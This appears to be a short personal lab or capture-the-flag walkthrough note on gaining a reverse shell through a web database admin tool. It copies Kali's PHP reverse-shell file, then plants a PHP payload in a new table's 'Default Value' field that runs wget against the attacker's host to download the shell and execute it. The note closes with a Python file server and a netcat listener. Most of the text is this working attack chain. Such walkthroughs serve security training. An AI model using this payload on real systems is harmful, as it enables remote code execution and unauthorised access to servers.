Video Walkthrough
https://www.youtube.com/watch?v=mHsMCfg_KQw
#### reverse shell
![[Pasted image 20220616154248.png]]
```bash - kali
cp /usr/share/webshells/php/php-reverse-shell.php ./Shelly.txt
```
edit file to host and ip.
Create a new Database poc.php
![[Pasted image 20220616154302.png]]
![[Pasted image 20220616154309.png]]
Create a new table:
![[Pasted image 20220616154316.png]]
Paste the following php code in the "Default Value" textbox.
```bash - kali
<?php system("wget $KALI:80/Shelly.txt -O /tmp/Shelly.php; php /tmp/Shelly.php"); ?>
```
![[Pasted image 20220616154329.png]]
Below, we can see our table was created in `/usr/local/databases/poc.php`
![[Pasted image 20220616154824.png]]
Now we set up our python server.
![[Python#Server]]
set up your netcat listener
![[1._rlwrap]]
![[Pasted image 20220406203648.png]]